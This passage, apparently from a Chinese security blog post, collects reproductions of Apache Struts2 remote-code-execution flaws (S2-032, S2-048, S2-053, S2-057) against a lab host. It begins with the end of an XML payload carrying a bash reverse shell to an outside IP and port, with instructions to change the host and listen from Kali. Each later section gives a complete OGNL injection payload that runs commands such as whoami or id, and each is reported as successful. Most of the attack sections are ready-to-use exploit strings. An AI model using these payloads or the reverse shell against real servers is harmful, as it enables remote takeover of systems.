class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">entry</span>&gt;</span> </span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">map</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>注意修改host</p>
+<p>然后注意修改command 部分</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">command</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i &gt;<span class="hljs-symbol">&amp;amp;</span> /dev/tcp/8.219.161.88/9090 0&gt;<span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">command</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>kali 模拟vps 监听端口</p>
+<p>然后发送数据包</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222300007.png" srcset="/img/loading.gif" lazyload alt="image-20240210222300007"></p>
+<p>利用成功</p>
+<h1 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h1><p>0x00</p>
+<p>使用Struts2Scan搜索存在什么漏洞</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222723131.png" srcset="/img/loading.gif" lazyload alt="image-20240210222723131"></p>
+<p>发现存在032漏洞</p>
+<p>0x01</p>
+<p>尝试利用</p>
+<p>payload</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?method:<span class="hljs-variable">%23</span>_memberAccess<span class="hljs-variable">%3</span>d<span class="hljs-variable">%40</span>ognl.OgnlContext<span class="hljs-variable">%20</span><span class="hljs-variable">%40</span>DEFAULT_MEMBER_ACCESS<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%40</span>java.lang.Runtime<span class="hljs-variable">%40</span>getRuntime<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.exec<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>parameters.command<span class="hljs-variable">%20</span><span class="hljs-variable">%5</span>B<span class="hljs-number">0</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%29</span>.getInputStream<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>b<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>java.io.InputStreamReader<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>a<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>java.io.BufferedReader<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>b<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%3</span>dnew<span class="hljs-variable">%20</span>char<span class="hljs-variable">%5</span>B<span class="hljs-number">51020</span><span class="hljs-variable">%5</span>D<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span><span class="hljs-keyword">c</span>.read<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx<span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%40</span>org.apache.struts<span class="hljs-number">2</span>.ServletActionContext<span class="hljs-variable">%40</span>getResponse<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span>.getWriter<span class="hljs-variable">%28</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx.println<span class="hljs-variable">%28</span><span class="hljs-variable">%23</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%29</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%23</span>kxlzx.close&amp;command<span class="hljs-operator">=</span>whoami<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210222945072.png" srcset="/img/loading.gif" lazyload alt="image-20240210222945072"></p>
+<p>利用成功</p>
+<h1 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h1><p>使用脚本跑，发现不存在该漏洞…</p>
+<p>就假装通过扫描器，我知道存在这个漏洞</p>
+<p>0x00</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210223829532.png" srcset="/img/loading.gif" lazyload alt="image-20240210223829532"></p>
+<p>使用payload </p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(<span class="hljs-string">&#x27;id&#x27;</span>).getInputStream())).(#q)&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210223952438.png" srcset="/img/loading.gif" lazyload alt="image-20240210223952438"></p>
+<p>依次填入</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210224020375.png" srcset="/img/loading.gif" lazyload alt="image-20240210224020375"></p>
+<p>成功执行命令</p>
+<h1 id="S2-053"><a href="#S2-053" class="headerlink" title="S2-053"></a>S2-053</h1><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。  </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210225959509.png" srcset="/img/loading.gif" lazyload alt="image-20240210225959509"></p>
+<p>还是没有被检测出来</p>
+<p>0x00</p>
+<p>访问路径</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.79.128:8080/hello.action">http://192.168.79.128:8080/hello.action</a></p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/20240210230151.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后使用payload</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[<span class="hljs-string">&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;</span>]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@<span class="hljs-keyword">class</span>)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=<span class="hljs-string">&#x27;id&#x27;</span>).(#iswin=(@java.lang.System@getProperty(<span class="hljs-string">&#x27;os.name&#x27;</span>).toLowerCase().contains(<span class="hljs-string">&#x27;win&#x27;</span>))).(#cmds=(#iswin?&#123;<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-string">&#x27;/c&#x27;</span>,#cmd&#125;:&#123;<span class="hljs-string">&#x27;/bin/bash&#x27;</span>,<span class="hljs-string">&#x27;-c&#x27;</span>,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>注意有一个空行</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210230317175.png" srcset="/img/loading.gif" lazyload alt="image-20240210230317175"></p>
+<h1 id="S2-057"><a href="#S2-057" class="headerlink" title="S2-057"></a>S2-057</h1><p>这个相对于前面的来说比较艰难</p>
+<p>当Struts2的配置满足以下条件时：</p>
+<blockquote>
+<p> alwaysSelectFullNamespace值为true</p>
+<p> action元素未设置namespace属性，或使用了通配符  </p>
+</blockquote>
+<p>namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。  </p>
+<p>0x00</p>
+<p>payload</p>
+<p><strong>2.3.20 版本</strong>  </p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.<span class="hljs-keyword">print</span>%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action<br></code></pre></td></tr></table></figure>
+
+<p> <strong>2.3.34 版本</strong>  </p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.<span class="hljs-keyword">print</span>%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.<span class="hljs-keyword">exec</span>%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action<br></code></pre></td></tr></table></figure>
+
+<p>漏洞验证，使用脚本发现还是没有扫描出漏洞</p>
+<p>直接使用脚本，然后</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%95%B4%E7%90%86/struts2%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/image-20240210230819514.png" srcset="/img/loading.gif" lazyload alt="image-20240210230819514"></p>
+<p>复现成功</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://tsy244.github.io/2024/02/10/整理/struts2漏洞整理/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>February 10, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/10/%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="域横向移动">
+                        <span class="hidden-mobile">域横向移动</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
